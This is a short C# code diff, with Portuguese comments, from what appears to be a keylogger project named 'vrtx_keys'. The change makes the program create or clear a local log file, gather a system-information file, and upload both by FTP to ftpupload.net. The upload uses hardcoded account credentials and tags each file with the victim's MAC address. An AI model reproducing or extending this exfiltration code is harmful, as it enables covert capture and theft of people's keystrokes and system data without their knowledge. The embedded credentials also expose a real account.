@@ -47,12 +47,20 @@ namespace vrtx_keys {
             if(!File.Exists(logFilepath)) {
                 //Criando o arquivo de log
                 using(StreamWriter sw = File.CreateText(logFilepath)) { }
-                //Criando o arquivo de informações do sistema
-                NetworkInteraction.GetExtraInfo();
+                //Criando o arquivo de informações do sistema   
+            }
+            else {
+                //Caso já exista um arquivo, limpamos o conteúdo do mesmo
+                File.WriteAllText(logFilepath, String.Empty);
+            }
+
+            if(!File.Exists(sysFilepath)) {
                 //Fazendo o upload do arquivo de informações do sistema
+                NetworkInteraction.GetExtraInfo();
             }
 
             NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", sysFilepath, NetworkInteraction.GetMacAddress(), sysUpload);
+            NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", logFilepath, NetworkInteraction.GetMacAddress(), logUpload);
 
             return logFilepath;
         }
